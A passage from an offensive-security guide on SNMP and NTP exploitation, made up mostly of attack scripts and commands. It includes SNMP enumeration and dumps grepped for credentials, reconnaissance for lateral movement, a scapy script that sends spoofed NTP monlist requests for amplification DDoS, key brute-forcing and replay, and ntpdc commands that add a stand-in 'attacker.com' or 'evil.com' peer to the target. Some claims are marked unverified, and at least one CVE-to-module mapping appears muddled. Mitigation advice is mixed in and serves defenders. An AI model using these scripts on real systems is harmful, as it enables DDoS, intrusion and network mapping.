snmpwalk -v2c -c $COMMUNITY $TARGET IP-MIB::ipRouteNextHop 2>/dev/null

echo -e "\n[+] TCP Connections"
snmpwalk -v2c -c $COMMUNITY $TARGET TCP-MIB::tcpConnState 2>/dev/null

echo -e "\n[+] Listening UDP Ports"
snmpwalk -v2c -c $COMMUNITY $TARGET UDP-MIB::udpLocalPort 2>/dev/null

echo -e "\n[+] Running Processes"
snmpwalk -v2c -c $COMMUNITY $TARGET HOST-RESOURCES-MIB::hrSWRunName 2>/dev/null

echo -e "\n[+] Installed Software"
snmpwalk -v2c -c $COMMUNITY $TARGET HOST-RESOURCES-MIB::hrSWInstalledName 2>/dev/null

echo -e "\n[+] Storage Information"
snmpwalk -v2c -c $COMMUNITY $TARGET HOST-RESOURCES-MIB::hrStorageDescr 2>/dev/null

echo -e "\n[+] User Accounts (Windows)"
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 2>/dev/null | cut -d'"' -f2

echo -e "\n[+] Network Shares (Windows)"
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.27 2>/dev/null

echo -e "\n[*] Enumeration Complete"
SCRIPT

chmod +x snmp_enum.sh
./snmp_enum.sh target_ip public
```

**Python-Based SNMP Information Gathering**

```python
#!/usr/bin/env python3
# snmp_info_disclosure.py

from pysnmp.hlapi import *
import sys

def snmp_get(target, community, oid):
    """Perform SNMP GET request"""
    iterator = getCmd(
        SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(ObjectIdentity(oid))
    )
    
    errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
    
    if errorIndication or errorStatus:
        return None
    else:
        return [(str(x[0]), str(x[1])) for x in varBinds]

def snmp_walk(target, community, oid):
    """Perform SNMP WALK request"""
    results = []
    for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
        SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(ObjectIdentity(oid)),
        lexicographicMode=False
    ):
        if errorIndication or errorStatus:
            break
        else:
            for varBind in varBinds:
                results.append((str(varBind[0]), str(varBind[1])))
    return results

def enumerate_snmp(target, community):
    """Comprehensive SNMP enumeration"""
    print(f"[*] SNMP Enumeration: {target}")
    print("=" * 60)
    
    # System Information
    print("\n[+] System Information:")
    oids = {
        'sysDescr': '1.3.6.1.2.1.1.1.0',
        'sysName': '1.3.6.1.2.1.1.5.0',
        'sysContact': '1.3.6.1.2.1.1.4.0',
        'sysLocation': '1.3.6.1.2.1.1.6.0',
        'sysUpTime': '1.3.6.1.2.1.1.3.0'
    }
    
    for name, oid in oids.items():
        result = snmp_get(target, community, oid)
        if result:
            print(f"  {name}: {result[0][1]}")
    
    # Network Interfaces
    print("\n[+] Network Interfaces:")
    interfaces = snmp_walk(target, community, '1.3.6.1.2.1.2.2.1.2')
    for oid, value in interfaces[:5]:  # Limit output
        print(f"  {value}")
    
    # IP Addresses
    print("\n[+] IP Addresses:")
    ips = snmp_walk(target, community, '1.3.6.1.2.1.4.20.1.1')
    for oid, value in ips:
        print(f"  {value}")
    
    # Running Processes
    print("\n[+] Running Processes (first 10):")
    processes = snmp_walk(target, community, '1.3.6.1.2.1.25.4.2.1.2')
    for oid, value in processes[:10]:
        print(f"  {value}")
    
    # Windows Users
    print("\n[+] Windows Users:")
    users = snmp_walk(target, community, '1.3.6.1.4.1.77.1.2.25.1.1')
    for oid, value in users:
        print(f"  {value}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <community_string>")
        sys.exit(1)
    
    target = sys.argv[1]
    community = sys.argv[2]
    
    enumerate_snmp(target, community)
```

**SNMP Data Exfiltration**

```bash
# Export complete SNMP tree to file
snmpwalk -v2c -c public target_ip > snmp_complete_dump.txt

# Export in different formats
snmpwalk -v2c -c public -O n target_ip > snmp_numeric.txt  # Numeric OIDs
snmpwalk -v2c -c public -O e target_ip > snmp_extended.txt  # Extended output
snmpwalk -v2c -c public -O s target_ip > snmp_symbolic.txt  # Symbolic output

# Export specific branches
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.1 > system_info.txt
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.2 > interfaces.txt
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.4 > ip_info.txt
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.6 > tcp_info.txt
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25 > host_resources.txt

# Parse and extract sensitive data
grep -iE "(password|passwd|credential|secret|key|token|user)" snmp_complete_dump.txt > sensitive_data.txt

# Extract all IP addresses from dump
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" snmp_complete_dump.txt | sort -u > discovered_ips.txt

# Extract MAC addresses
grep -oE "([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})" snmp_complete_dump.txt | sort -u > discovered_macs.txt
```

**SNMP Monitoring and Real-Time Analysis**

```bash
# Monitor SNMP traffic
tcpdump -i eth0 -n port 161 or port 162 -A

# Capture SNMP traffic to file
tcpdump -i eth0 -n port 161 or port 162 -w snmp_traffic.pcap

# Parse SNMP community strings from traffic
tshark -r snmp_traffic.pcap -Y "snmp" -T fields -e snmp.community | sort -u

# Monitor SNMP traps
snmptrapd -f -Lo -c /etc/snmp/snmptrapd.conf

# Real-time SNMP polling
watch -n 5 'snmpwalk -v2c -c public target_ip system'
```

**SNMP Reconnaissance for Lateral Movement**

```bash
# Discover network topology via SNMP
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteNextHop | awk '{print $4}' | sort -u

# Enumerate neighboring devices
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheAddress 2>/dev/null

# Discover management servers (from trap destinations)
snmpwalk -v2c -c public target_ip SNMP-TARGET-MIB::snmpTargetAddrTAddress

# Map internal network from routing tables
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteDest
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteMask

# Identify critical servers from active connections
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnRemAddress | awk '{print $4}' | sort -u
```

**Advanced SNMP Exploitation Techniques**

```bash
# SNMP Amplification Attack (DoS)
# [Inference] Can be used for DDoS by spoofing source IP
# USE ONLY IN AUTHORIZED TESTING
snmpwalk -v2c -c public target_ip .1 | wc -l  # Test response size

# GetBulk requests for faster enumeration
snmpbulkwalk -v2c -c public -Cr50 target_ip

# SNMP reflection check
# Send request with spoofed source IP (requires raw socket access)
# [Unverified] Requires specialized tools like hping3 or scapy

# IPv6 SNMP enumeration
snmpwalk -v2c -c public udp6:[target_ipv6]:161 system
snmpwalk -v2c -c public udp6:[fe80::1%eth0]:161 system
```

**SNMP Security Assessment Report Generation**

```bash
# Generate comprehensive report
cat > snmp_report.sh << 'SCRIPT'
#!/bin/bash

TARGET=$1
COMMUNITY=$2
OUTPUT="snmp_report_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"

{
    echo "SNMP Security Assessment Report"
    echo "================================"
    echo "Target: $TARGET"
    echo "Community String: $COMMUNITY"
    echo "Date: $(date)"
    echo ""
    
    echo "1. System Information"
    echo "---------------------"
    snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysDescr.0 2>/dev/null
    snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysName.0 2>/dev/null
    snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysUpTime.0 2>/dev/null
    echo ""
    
    echo "2. Network Configuration"
    echo "------------------------"
    echo "IP Addresses:"
    snmpwalk -v2c -c $COMMUNITY $TARGET IP-MIB::ipAdEntAddr 2>/dev/null
    echo ""
    echo "Network Interfaces:"
    snmpwalk -v2c -c $COMMUNITY $TARGET IF-MIB::ifDescr 2>/dev/null | head -5
    echo ""
    
    echo "3. Active Connections"
    echo "---------------------"
    snmpwalk -v2c -c $COMMUNITY $TARGET TCP-MIB::tcpConnState 2>/dev/null | wc -l
    echo "TCP connections found"
    echo ""
    
    echo "4. Running Processes"
    echo "--------------------"
    snmpwalk -v2c -c $COMMUNITY $TARGET HOST-RESOURCES-MIB::hrSWRunName 2>/dev/null | wc -l
    echo "processes enumerated"
    echo ""
    
    echo "5. User Accounts (Windows)"
    echo "--------------------------"
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 2>/dev/null | cut -d'"' -f2
    echo ""
    
    echo "6. Security Recommendations"
    echo "----------------------------"
    echo "- Change default community string '$COMMUNITY'"
    echo "- Implement SNMPv3 with authentication"
    echo "- Restrict SNMP access to management networks only"
    echo "- Disable SNMP if not required"
    echo "- Monitor SNMP traffic for anomalies"
    
} | tee $OUTPUT

echo "[*] Report saved to: $OUTPUT"
SCRIPT

chmod +x snmp_report.sh
./snmp_report.sh target_ip public
```

---

**Critical Testing Considerations:**

1. **SNMPv1/v2c Security** - Community strings transmitted in plaintext, easily intercepted via network sniffing
2. **Write Access Risk** - "private" or write-enabled community strings allow device configuration modification
3. **Information Leakage** - SNMP can expose sensitive system details, user accounts, network topology, and running processes
4. **[Inference]** Default community strings ("public", "private") are commonly unchanged in production environments
5. **SNMPv3 Recommended** - Provides authentication and encryption, significantly improving security over v1/v2c
6. **Network Segmentation** - SNMP should only be accessible from trusted management networks
7. **Amplification Attacks** - SNMP can be abused for DDoS via reflection/amplification (test responsibly)

**Related Exploitation Paths:**

- Use discovered network topology for lateral movement planning
- Extracted credentials/hashes for authentication attacks
- Process information for vulnerability identification
- Configuration data for privilege escalation
- Network maps for targeted attacks on critical infrastructure

---

## NTP Exploitation

### NTP Amplification DDoS

NTP amplification is a reflection-based DDoS attack that exploits publicly accessible NTP servers using the `monlist` command (or `MON_GETLIST`), which can generate responses up to 206 times larger than the request.

**Understanding NTP Amplification:**

The `monlist` command returns the last 600 clients that have interacted with the NTP server. This creates a large response from a small query, making it effective for amplification attacks.

**Detection and Reconnaissance:**

1. **Identify vulnerable NTP servers**:

```bash
# Basic NTP version detection
nmap -sU -p123 --script ntp-info target.com

# Check for monlist support
nmap -sU -p123 --script ntp-monlist target.com

# Scan subnet for NTP servers
nmap -sU -p123 -Pn 192.168.1.0/24

# Fast scan for vulnerable servers
nmap -sU -p123 --script ntp-monlist --script-args ntp-monlist.showall -iL targets.txt -oA ntp_vulnerable

# Using masscan for large-scale discovery
masscan -pU:123 0.0.0.0/0 --rate 10000 --output-format list -oL ntp_servers.txt
```

2. **Manual testing with ntpdc**:

```bash
# Install NTP utilities
apt-get install ntp ntpdate

# Query monlist command
ntpdc -n -c monlist target.com

# Check response
ntpdc -c sysinfo target.com
ntpdc -c peers target.com

# Alternative using ntpq
ntpq -c readlist target.com
ntpq -c peers target.com
```

3. **Manual testing with raw packets**:

```bash
# Using echo and nc
echo -e "\x17\x00\x03\x2a" | nc -u target.com 123

# Using printf
printf "\x17\x00\x03\x2a\x00\x00\x00\x00" | nc -u -w1 target.com 123

# Check if response is significantly larger than request
```

4. **Using Metasploit scanner**:

```bash
msfconsole
use auxiliary/scanner/ntp/ntp_monlist
set RHOSTS target.com
run

# Scan multiple hosts
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

5. **Python script for detection**:

```python
#!/usr/bin/env python3
import socket
import sys

def check_ntp_monlist(target, port=123):
    # NTP monlist query packet
    packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    
    try:
        sock.sendto(packet, (target, port))
        response, _ = sock.recvfrom(4096)
        
        if len(response) > len(packet):
            amplification = len(response) / len(packet)
            print(f"[+] {target} is vulnerable!")
            print(f"    Request: {len(packet)} bytes")
            print(f"    Response: {len(response)} bytes")
            print(f"    Amplification factor: {amplification:.2f}x")
            return True
        else:
            print(f"[-] {target} is not vulnerable")
            return False
    except socket.timeout:
        print(f"[-] {target} - No response (timeout)")
        return False
    except Exception as e:
        print(f"[-] {target} - Error: {e}")
        return False
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    
    check_ntp_monlist(sys.argv[1])
```

**Exploitation Techniques:**

**[CRITICAL WARNING]** DDoS attacks are illegal and unethical. This information is provided for defensive purposes, security research in authorized environments, and educational understanding only.

1. **Understanding the attack flow**:

```bash
# Attack flow:
# Attacker -> Spoofed Request (victim IP as source) -> NTP Server
# NTP Server -> Large Response -> Victim

# The attacker sends small requests with spoofed source IP (victim's IP)
# The NTP server responds with much larger data to the victim
# Multiple NTP servers amplify the attack significantly
```

2. **Calculating amplification factor**:

```bash
# Request size: ~8 bytes
# Response size: Up to 482+ times larger (depending on monlist data)

# Example calculation:
# 8-byte request → 4000-byte response = 500x amplification
# 10 Mbps attacker traffic → 5 Gbps attack on victim

# Check actual amplification
tcpdump -i eth0 -n udp port 123 -v

# Measure packet sizes
tcpdump -i eth0 -n udp port 123 -v | grep "length"
```

3. **Testing amplification locally** [Inference - only in authorized lab environment]:

```bash
# Setup test environment with two machines
# Machine A: NTP server (vulnerable)
# Machine B: Attacker (testing)
# Machine C: Victim (monitoring)

# On attacker machine, send spoofed request
# Using hping3
hping3 -2 -p 123 -d 8 -s 123 --spoof <victim_ip> <ntp_server_ip>

# Using scapy
cat > test_amplification.py <<'EOF'
#!/usr/bin/env python3
from scapy.all import *

def test_amplification(ntp_server, victim_ip):
    # Create NTP monlist request packet
    packet = IP(src=victim_ip, dst=ntp_server) / \
             UDP(sport=123, dport=123) / \
             Raw(load="\x17\x00\x03\x2a" + "\x00"*4)
    
    print(f"[*] Sending spoofed request to {ntp_server}")
    print(f"[*] Spoofed source: {victim_ip}")
    send(packet, verbose=0)
    print(f"[+] Packet sent. Check victim for incoming traffic.")

# ONLY USE IN AUTHORIZED LAB ENVIRONMENT
# test_amplification("192.168.1.100", "192.168.1.200")
EOF
```

4. **Metasploit amplification module** [Unverified - educational reference only]:

```bash
msfconsole
use auxiliary/scanner/ntp/ntp_monlist

# This module only tests for vulnerability, not exploitation
# For actual DDoS, separate tools would be required (not covered here)
```

**Defense and Mitigation:**

1. **Disable monlist command**:

```bash
# On NTP server (ntpd), edit configuration
nano /etc/ntp.conf

# Add restriction to disable monlist
disable monitor

# Or add specific restrictions
restrict default kod nomodify notrap nopeer noquery
restrict -6 default kod nomodify notrap nopeer noquery

# Allow localhost
restrict 127.0.0.1
restrict -6 ::1

# Restart NTP service
systemctl restart ntp
# or
service ntp restart

# Verify monlist is disabled
ntpdc -n -c monlist localhost
# Should return: "***Command declined"
```

2. **Upgrade NTP version**:

```bash
# Check current version
ntpq -c version

# NTP 4.2.7p26 and later have monlist disabled by default
# Update if running older version
apt-get update && apt-get upgrade ntp

# On Red Hat/CentOS
yum update ntp
```

3. **Implement rate limiting**:

```bash
# Using iptables to rate limit NTP queries
iptables -A INPUT -p udp --dport 123 -m state --state NEW -m recent --set --name NTP
iptables -A INPUT -p udp --dport 123 -m state --state NEW -m recent --update --seconds 60 --hitcount 10 --name NTP -j DROP

# Using firewalld
firewall-cmd --permanent --add-rich-rule='rule service name="ntp" limit value="10/m" accept'
firewall-cmd --reload
```

4. **Network-level protection**:

```bash
# Configure firewall to only allow NTP from trusted sources
iptables -A INPUT -p udp --dport 123 -s trusted_network/24 -j ACCEPT
iptables -A INPUT -p udp --dport 123 -j DROP

# Block NTP amplification at border router
# Implement BCP 38 (ingress filtering)
# Drop packets with spoofed source addresses
```

5. **Monitor for attacks**:

```bash
# Monitor NTP traffic
tcpdump -i eth0 -n udp port 123 -v

# Watch for anomalies
watch -n 1 'netstat -su | grep -i udp'

# Log analysis
tail -f /var/log/syslog | grep ntpd

# Check for unusual traffic patterns
iftop -i eth0 -f "udp port 123"

# Using tshark
tshark -i eth0 -f "udp port 123" -T fields -e ip.src -e ip.dst -e frame.len
```

**Identifying Amplification Attacks (Victim Perspective):**

```bash
# Detect incoming NTP amplification attack
tcpdump -i eth0 -n udp port 123 -c 100

# Look for:
# - Multiple source IPs
# - Large packet sizes (>500 bytes)
# - High packet rate
# - Source port 123

# Check network bandwidth
iftop -i eth0

# Count packets per source
tcpdump -i eth0 -n udp port 123 -c 1000 | awk '{print $3}' | sort | uniq -c | sort -rn

# Using netstat
netstat -su | grep -i "packets received"

# Check firewall logs
tail -f /var/log/kern.log | grep -i ntp
```

### NTP Information Disclosure

NTP servers can leak sensitive information about the network, system configuration, and connected clients.

**Information Gathering Techniques:**

1. **Basic NTP queries**:

```bash
# Query NTP version
ntpq -c version target.com

# Query system information
ntpdc -c sysinfo target.com

# Query peer information
ntpq -c peers target.com
ntpq -c associations target.com

# Query all variables
ntpq -c readvar target.com

# Query runtime variables
ntpq -c rv target.com

# Detailed peer information
ntpq -p target.com
```

2. **Using Nmap NSE scripts**:

```bash
# Comprehensive NTP information gathering
nmap -sU -p123 --script ntp-info target.com

# Get monlist (list of clients)
nmap -sU -p123 --script ntp-monlist target.com

# Show all clients from monlist
nmap -sU -p123 --script ntp-monlist --script-args ntp-monlist.showall target.com

# Multiple scripts
nmap -sU -p123 --script "ntp-*" target.com -oA ntp_scan
```

3. **Extract client list (monlist)**:

```bash
# Using ntpdc
ntpdc -n -c monlist target.com

# Output shows:
# - IP addresses of recent clients
# - Number of packets exchanged
# - Last contact time
# - NTP version used

# Parse output for IP addresses
ntpdc -n -c monlist target.com | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u

# Create target list from monlist
ntpdc -n -c monlist target.com | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > discovered_hosts.txt
```

4. **Query specific NTP variables**:

```bash
# System variables
ntpq -c "rv 0 version,processor,system,stratum,precision,refid" target.com

# Peer status
ntpq -c "rv 0 offset,jitter,rootdisp,reftime" target.com

# Clock information
ntpq -c clockvar target.com

# Kernel variables
ntpq -c kerninfo target.com
```

5. **Automated information gathering script**:

```bash
#!/bin/bash
# ntp_info_gather.sh

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

echo "=== NTP Information Gathering for $TARGET ==="
echo ""

echo "[*] NTP Version:"
ntpq -c version $TARGET 2>/dev/null
echo ""

echo "[*] System Information:"
ntpdc -c sysinfo $TARGET 2>/dev/null
echo ""

echo "[*] Peer List:"
ntpq -c peers $TARGET 2>/dev/null
echo ""

echo "[*] System Variables:"
ntpq -c readvar $TARGET 2>/dev/null
echo ""

echo "[*] Monlist (Recent Clients):"
ntpdc -n -c monlist $TARGET 2>/dev/null
echo ""

echo "[*] Extracted IP Addresses:"
ntpdc -n -c monlist $TARGET 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u
echo ""

echo "=== Information Gathering Complete ==="
```

6. **Using ntpdate for information**:

```bash
# Query time and basic info
ntpdate -q target.com

# Verbose output
ntpdate -d target.com

# Get offset information
ntpdate -q target.com | grep "offset"
```

**Sensitive Information That May Be Disclosed:**

```bash
# 1. Internal IP addresses (from monlist)
# - Reveals internal network topology
# - Identifies live hosts
# - Shows network segments

# 2. Operating system information
ntpq -c "rv 0 system" target.com
# Example output: system="Linux/4.15.0"

# 3. NTP server hierarchy (stratum information)
ntpq -c "rv 0 stratum,refid" target.com
# Reveals upstream time sources

# 4. Server uptime
ntpdc -c sysinfo target.com | grep "system uptime"

# 5. Synchronization status
ntpq -c peers target.com
# Shows if system is properly synchronized

# 6. Leap indicator issues
ntpq -c "rv 0 leap" target.com
# Can indicate configuration problems

# 7. Reference time source
ntpq -c "rv 0 refid,reftime" target.com
# Shows which server is being used as reference
```

**Leveraging Disclosed Information:**

1. **Map internal network**:

```bash
# Extract all IPs from monlist
ntpdc -n -c monlist target.com | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | \
  grep -v "^127\." | grep -v "^0\." | sort -u > internal_ips.txt

# Identify internal subnets
cat internal_ips.txt | cut -d'.' -f1-3 | sort -u | while read subnet; do
  echo "Potential subnet: $subnet.0/24"
done

# Use discovered IPs for further scanning
nmap -iL internal_ips.txt -p 22,80,443,445 -oA discovered_hosts_scan
```

2. **Fingerprint systems**:

```bash
# Correlate NTP version with OS
ntpq -c version target.com

# Common correlations:
# ntpd 4.2.8p15 -> Ubuntu 20.04
# ntpd 4.2.6p5 -> CentOS 7
# W32Time -> Windows Server

# Use for targeted exploitation
```

3. **Identify time-based vulnerabilities**:

```bash
# Check if time is significantly off
ntpdate -q target.com | grep offset

# Large time offsets can indicate:
# - Certificate validation issues
# - Kerberos authentication problems
# - Log tampering opportunities
```

**Metasploit Information Gathering:**

```bash
msfconsole

# NTP information module
use auxiliary/scanner/ntp/ntp_readvar
set RHOSTS target.com
run

# NTP peer scanner
use auxiliary/scanner/ntp/ntp_peer_list_sum
set RHOSTS target.com
run

# Multiple hosts
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**Advanced Queries:**

```bash
# Query mode 6 (control messages)
ntpq -c "mreadvar 0" target.com

# Query mode 7 (private/restricted)
ntpdc -c "readvar 0" target.com

# Get detailed association data
ntpq -c associations target.com
ntpq -c "lassociations" target.com

# Show all associations with details
ntpq -c "lpeers" target.com

# Authentication key status
ntpdc -c authinfo target.com

# Traffic statistics
ntpdc -c iostats target.com
```

**Python script for comprehensive info gathering**:

```python
#!/usr/bin/env python3
import socket
import struct
import sys

def query_ntp_info(target, port=123):
    # NTP mode 6 (control) packet for readvar
    # \x16 = mode 6, \x02 = read variables operation
    packet = b'\x16\x02\x00\x00' + b'\x00' * 44
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    
    try:
        sock.sendto(packet, (target, port))
        response, _ = sock.recvfrom(1024)
        
        print(f"[+] Response from {target}:")
        print(f"    Response length: {len(response)} bytes")
        
        # Parse response (simplified)
        if len(response) > 0:
            print(f"    Raw data: {response[:100]}")
            
            # Try to extract readable strings
            readable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in response)
            if readable:
                print(f"    Readable content: {readable[:200]}")
        
        return response
    except socket.timeout:
        print(f"[-] {target} - No response (timeout)")
        return None
    except Exception as e:
        print(f"[-] {target} - Error: {e}")
        return None
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    
    query_ntp_info(sys.argv[1])
```

### NTP Authentication Bypass

NTP supports authentication using symmetric keys, but misconfigurations or weak implementations can be exploited.

**Understanding NTP Authentication:**

```bash
# NTP authentication uses symmetric keys
# Configuration typically in /etc/ntp.conf and /etc/ntp.keys

# Example configuration:
# ntp.conf:
# keys /etc/ntp.keys
# trustedkey 1
# requestkey 1
# controlkey 1

# ntp.keys:
# 1 M MySecretKey
```

**Testing for Authentication:**

1. **Check if authentication is required**:

```bash
# Test unauthenticated queries
ntpq -c peers target.com
ntpq -c readvar target.com

# If these work, authentication may not be enforced for queries

# Test mode 6 (control) without auth
ntpdc -c sysinfo target.com

# If this works, control operations don't require auth
```

2. **Identify authentication status**:

```bash
# Using Nmap
nmap -sU -p123 --script ntp-info target.com | grep -i auth

# Query authentication info
ntpdc -c authinfo target.com

# Check for authentication keys in use
ntpq -c "rv 0" target.com | grep -i key
```

3. **Test for weak or default keys**:

```bash
# Common default keys to test
cat > default_keys.txt <<EOF
1 M password
1 M secret
1 M ntp
1 M admin
1 M 123456
1 M changeme
EOF

# Manual testing (requires custom tools or scripts)
```

**Authentication Bypass Techniques:**

1. **Mode 6 packet forgery** [Inference - requires specific conditions]:

```bash
# Some NTP implementations don't properly validate mode 6 packets
# Attacker can send control messages without proper authentication

# Using ntpq with mode 6
ntpq -c "readvar 0 version" target.com

# If successful without authentication, bypass exists
```

2. **Exploiting crypto-NAK vulnerability (CVE-2015-7871)**:

```bash
# Older NTP versions vulnerable to authentication bypass
# via crafted crypto-NAK response

# Check NTP version
ntpq -c version target.com

# Vulnerable versions: NTP 4.2.8p3 and earlier, 4.3.x before 4.3.77

# Using Metasploit
msfconsole
use auxiliary/scanner/ntp/ntp_nak
set RHOSTS target.com
run
```

3. **Brute forcing authentication keys**:

```bash
# If authentication is enabled, keys may be weak

# Custom script to test keys
#!/bin/bash
# ntp_key_bruteforce.sh

TARGET=$1
KEYFILE=$2

while IFS= read -r key; do
  echo "[*] Testing key: $key"
  
  # Create temporary key file
  echo "1 M $key" > /tmp/test_key
  
  # Attempt authenticated query
  # Note: This requires custom implementation
  # ntpq doesn't directly support key specification from command line
  
  # Alternative: use ntpkeygen and test
done < "$KEYFILE"
```

4. **Replay attacks** [Inference - if timestamps not properly validated]:

```bash
# Capture legitimate authenticated packet
tcpdump -i eth0 -n udp port 123 -w ntp_capture.pcap

# Extract and replay packet
tcpreplay -i eth0 ntp_capture.pcap

# Or use scapy
cat > ntp_replay.py <<'EOF'
#!/usr/bin/env python3
from scapy.all import *

# Read captured packet
packets = rdpcap("ntp_capture.pcap")

# Replay authenticated packet
send(packets[0])
EOF
```

5. **Mode 7 exploitation (ntpdc)**:

```bash
# Mode 7 (private) queries may have weaker authentication

# Test mode 7 commands
ntpdc -c monlist target.com
ntpdc -c listpeers target.com
ntpdc -c peers target.com
ntpdc -c sysinfo target.com

# If these work without auth, mode 7 is not properly secured

# Try administrative commands
ntpdc -c "addpeer evil.com" target.com
ntpdc -c "unconfig peer.ntp.org" target.com

# These should fail, but if auth is bypassed, could succeed
```

**Exploiting Weak Authentication:**

1. **Default key exploitation**:

```bash
# Test for default/weak keys in configuration

# Generate wordlist of common keys
cat > ntp_keys_wordlist.txt <<EOF
password
secret
admin
ntp
changeme
default
key
time
sync
EOF

# If you can access /etc/ntp.keys (via other vulnerability)
cat /etc/ntp.keys

# Look for patterns like:
# 1 M password
# 2 MD5 secret123
```

2. **Downgrade attacks** [Inference - protocol-specific]:

```bash
# Force server to use weaker authentication
# Send packets requesting no authentication

# Using scapy
cat > ntp_downgrade.py <<'EOF'
#!/usr/bin/env python3
from scapy.all import *

def attempt_downgrade(target):
    # Create NTP packet without authentication
    packet = IP(dst=target) / UDP(dport=123) / Raw(load="\x1b" + "\x00"*47)
    
    send(packet)
    print(f"[*] Sent downgrade attempt to {target}")

# attempt_downgrade("192.168.1.100")
EOF
```

3. **Timing attacks on key validation** [Unverified - theoretical]:

```bash
# Measure response times for different keys
# Valid keys may take longer to process

for key in $(cat wordlist.txt); do
  start=$(date +%s%N)
  # Attempt authentication with key
  # (requires custom implementation)
  end=$(date +%s%N)
  elapsed=$((($end - $start) / 1000000))
  echo "$key: ${elapsed}ms"
done
```

**Post-Authentication Exploitation:**

```bash
# If authentication is bypassed or keys obtained:

# 1. Modify time
ntpdc -c "setvar clockadjust 3600" target.com
# Shifts time by 1 hour

# 2. Add malicious peer
ntpdc -c "addpeer attacker.com" target.com

# 3. Remove legitimate peers
ntpdc -c "unpeer peer.ntp.org" target.com

# 4. Change configuration
ntpdc -c "config 'server evil.com'" target.com

# 5. Disable NTP
ntpdc -c "restrict default ignore" target.com
```

**Specific Vulnerability Exploits:**

1. **CVE-2013-5211 (monlist/DDoS)**:

```bash
# Already covered in amplification section
nmap -sU -p123 --script ntp-monlist target.com
```

2. **CVE-2014-9293 (Weak default key)**:

```bash
# NTP versions before 4.2.7p11 use weak default keys
# Default key derivation is predictable

# Check version
ntpq -c version target.com

# If vulnerable version, attempt to derive default keys
# (requires cryptographic analysis - not covered in detail)
```

3. **CVE-2014-9294 (Crypto-NAK bypass)**:

```bash
# Authentication can be bypassed with crafted packets

# Metasploit module
msfconsole
use auxiliary/dos/ntp/ntpd_reserved_dos
set RHOSTS target.com
run
```

4. **CVE-2015-7871 (Authentication bypass)**:

```bash
# Mode 6/7 authentication bypass in NTP 4.2.x

# Check if vulnerable
nmap -sU -p123 --script ntp-info target.com | grep -i version

# Vulnerable versions: 4.2.8p3 and earlier

# Manual exploitation requires crafted mode 6 packets
```

**Defense and Mitigation:**

1. **Properly configure authentication**:

```bash
# Generate strong keys
ntpkeygen -M

# Configure ntp.conf
nano /etc/ntp.conf

# Add authentication
keys /etc/ntp.keys
trustedkey 1 2 3
requestkey 1
controlkey 1

# Restrict access
restrict default kod nomodify notrap nopeer noquery
restrict -6 default kod nomodify notrap nopeer noquery
restrict 127.0.0.1
restrict -6 ::1

# Create /etc/ntp.keys with strong keys
nano /etc/ntp.keys
# Add:
# 1 MD5 $(openssl rand -base64 20)
# 2 MD5 $(openssl rand -base64 20)

chmod 600 /etc/ntp.keys

# Restart NTP
systemctl restart ntp
```

2. **Disable unnecessary features**:

```bash
# Disable mode 6/7 queries
echo "disable monitor" >> /etc/ntp.conf

# Disable private queries
restrict default noquery nopeer

# Restart service
systemctl restart ntp
```

3. **Update NTP daemon**:

```bash
# Check version
ntpd --version

# Update to latest
apt-get update && apt-get upgrade ntp

# Consider switching to chrony (more secure alternative)
apt-get install chrony
systemctl enable chronyd
systemctl start chronyd
```

4. **Network-level protection**:

```bash
# Firewall rules to restrict NTP access
iptables -A INPUT -p udp --dport 123 -s trusted_network/24 -j ACCEPT
iptables -A INPUT -p udp --dport 123 -j DROP

# Rate limiting
iptables -A INPUT -p udp --dport 123 -m limit --limit 10/min -j ACCEPT
iptables -A INPUT -p udp --dport 123 -j DROP
```

5. **Monitoring and detection**:

```bash
# Monitor NTP logs
tail -f /var/log/ntp.log

# Watch for authentication failures
grep -i "auth" /var/log/syslog

# Monitor traffic
tcpdump -i eth0 -n udp port 123 -v

# Set up alerts for unusual activity
cat > /etc/ntp_monitor.sh <<'EOF'
#!/bin/bash
# Alert on high NTP traffic
THRESHOLD=1000
CURRENT=$(netstat -su | grep "packets received" | awk '{print $1}')

